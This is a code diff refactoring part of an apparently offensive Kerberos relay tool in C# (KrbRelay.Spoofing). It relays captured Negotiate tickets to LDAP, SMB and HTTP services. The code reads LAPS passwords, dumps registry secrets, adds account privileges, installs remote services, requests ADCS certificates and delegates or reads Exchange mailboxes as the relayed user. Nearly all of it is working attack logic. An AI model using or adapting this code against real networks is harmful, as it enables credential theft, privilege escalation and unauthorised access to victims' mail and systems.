@@ -84,8 +84,6 @@ namespace KrbRelay.Spoofing
 
     internal class HttpRelayServer
     {
-
-
         public static void start(string Service, string argSpooferIP)
         {
             Console.WriteLine("[*] Listening for connections on http://{0}:80", argSpooferIP);
@@ -99,17 +97,18 @@ namespace KrbRelay.Spoofing
             Console.WriteLine("ldapclient");
 
             byte[] apReq = Convert.FromBase64String(ticket.Replace("Negotiate ", ""));
+            var buffer = new SecurityBuffer(apReq);
 
-            var sTicket = new Natives.SecBuffer(apReq);
-            var berval = new Natives.berval
+            var berval = new berval
             {
-                bv_len = sTicket.cbBuffer,
-                bv_val = sTicket.pvBuffer
+                bv_len = buffer.Count,
+                bv_val = buffer.Token
             };
             var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
             Marshal.StructureToPtr(berval, bervalPtr, false);
-            var bind = Natives.ldap_sasl_bind(
-                Program.ld,
+
+            var bind = Interop.ldap_sasl_bind(
+                State.ld,
                 "",
                 "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                 bervalPtr,
@@ -117,15 +116,20 @@ namespace KrbRelay.Spoofing
                 IntPtr.Zero,
                 out IntPtr servresp);
             Console.WriteLine("[*] bind: {0}", bind);
-            Natives.ldap_get_option(Program.ld, 0x0031, out int value);
-            Console.WriteLine("[*] ldap_get_option: {0}", (Natives.LdapStatus)value);
-            if ((Natives.LdapStatus)value == Natives.LdapStatus.LDAP_SUCCESS)
+
+            Interop.ldap_get_option(State.ld, 0x0031, out int value);
+            LdapStatus status = (LdapStatus)value;
+
+            Console.WriteLine("[*] Interop.ldap_get_option: {0}", status);
+
+            if (status == LdapStatus.Success)
             {
                 Console.WriteLine("[+] LDAP session established");
-                Clients.Attacks.Ldap.LAPS.read(Program.ld, "");
+                Clients.Attacks.Ldap.LAPS.read(State.ld, "");
             }
 
             //return string.Format("Negotiate {0}", Convert.ToBase64String(resp));
+
             return "";
         }
         public static string smbConnect(string ticket)
@@ -135,30 +139,30 @@ namespace KrbRelay.Spoofing
             if (success)
             {
                 Console.WriteLine("[+] SMB session established");
-                //Program.stopSpoofing = true;
+                //State.stopSpoofing = true;
 
                 try
                 {
-                    if (Program.attacks.Keys.Contains("console"))
+                    if (State.attacks.Keys.Contains("console"))
                     {
                         Clients.Attacks.Smb.Shares.smbConsole(Program.smbClient);
                     }
-                    if (Program.attacks.Keys.Contains("list"))
+                    if (State.attacks.Keys.Contains("list"))
                     {
                         Clients.Attacks.Smb.Shares.listShares(Program.smbClient);
                     }
-                    if (Program.attacks.Keys.Contains("add-privileges"))
+                    if (State.attacks.Keys.Contains("add-privileges"))
                     {
-                        Clients.Attacks.Smb.LSA.AddAccountRights(Program.smbClient, Program.attacks["add-privileges"]);
+                        Clients.Attacks.Smb.LSA.AddAccountRights(Program.smbClient, State.attacks["add-privileges"]);
                     }
-                    if (Program.attacks.Keys.Contains("secrets"))
+                    if (State.attacks.Keys.Contains("secrets"))
                     {
                         Clients.Attacks.Smb.RemoteRegistry.secretsDump(Program.smbClient, false);
                     }
-                    if (Program.attacks.Keys.Contains("service-add"))
+                    if (State.attacks.Keys.Contains("service-add"))
                     {
-                        string arg1 = Program.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
-                        string arg2 = Program.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
+                        string arg1 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
+                        string arg2 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                         Clients.Attacks.Smb.ServiceManager.serviceInstall(Program.smbClient, arg1, arg2);
                     }
                 }
@@ -166,8 +170,6 @@ namespace KrbRelay.Spoofing
                 {
                     Console.WriteLine("[-] {0}", e);
                 }
-
-                //Environment.Exit(0);
             }
 
             return string.Format("Negotiate {0}", Convert.ToBase64String(resp));
@@ -175,9 +177,9 @@ namespace KrbRelay.Spoofing
         public static string httpConnect(string ticket)
         {
             string endpoint = "/";
-            if (!string.IsNullOrEmpty(Program.attacks["endpoint"]))
+            if (!string.IsNullOrEmpty(State.attacks["endpoint"]))
             {
-                endpoint = Program.attacks["endpoint"].TrimStart('/');
+                endpoint = State.attacks["endpoint"].TrimStart('/');
             }
 
             HttpResponseMessage result;
@@ -209,32 +211,30 @@ namespace KrbRelay.Spoofing
 
                 try
                 {
-                    if (Program.attacks.Keys.Contains("proxy"))
+                    if (State.attacks.Keys.Contains("proxy"))
                     {
                         Clients.Attacks.Http.ProxyServer.Start(Program.httpClient, Program.httpClient.BaseAddress.ToString());
                     }
 
-                    if (Program.attacks.Keys.Contains("adcs"))
+                    if (State.attacks.Keys.Contains("adcs"))
                     {
-                        Clients.Attacks.Http.ADCS.requestCertificate(Program.httpClient, Program.relayedUser, Program.relayedUserDomain, Program.attacks["adcs"]);
+                        Clients.Attacks.Http.ADCS.requestCertificate(Program.httpClient, State.relayedUser, State.relayedUserDomain, State.attacks["adcs"]);
                     }
 
-                    if (Program.attacks.Keys.Contains("ews-delegate"))
+                    if (State.attacks.Keys.Contains("ews-delegate"))
                     {
-                        Clients.Attacks.Http.EWS.delegateMailbox(Program.httpClient, Program.relayedUser, Program.attacks["ews-delegate"]);
+                        Clients.Attacks.Http.EWS.delegateMailbox(Program.httpClient, State.relayedUser, State.attacks["ews-delegate"]);
                     }
 
-                    if (Program.attacks.Keys.Contains("ews-search"))
+                    if (State.attacks.Keys.Contains("ews-search"))
                     {
-                        Clients.Attacks.Http.EWS.readMailbox(Program.httpClient, "inbox", Program.attacks["ews-search"]);
+                        Clients.Attacks.Http.EWS.readMailbox(Program.httpClient, "inbox", State.attacks["ews-search"]);
                     }
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine("[-] {0}", e);
                 }
-
-                //Environment.Exit(0);
             }
             else
             {
